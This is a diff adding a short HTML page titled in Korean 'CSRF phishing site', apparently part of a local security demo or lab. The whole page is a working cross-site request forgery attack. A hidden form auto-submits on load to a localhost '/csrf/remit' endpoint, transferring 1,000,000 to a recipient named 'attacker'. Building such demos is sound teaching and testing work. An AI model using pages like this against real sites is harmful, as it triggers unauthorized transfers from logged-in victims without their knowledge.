@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>CSRF 피싱 사이트</title>
+    </head>
+    <body>
+        <form id="remit"  action="http://localhost:3000/csrf/remit" method="POST">
+            <div>
+                <input type="text" name="to" value="공격자"/>
+                <input type="text" name="amount" value="1000000"/>
+            </div>
+            <script>
+                document.querySelector("#remit").submit();
+            </script>
+        </form>
+    </body>
+</html>
+
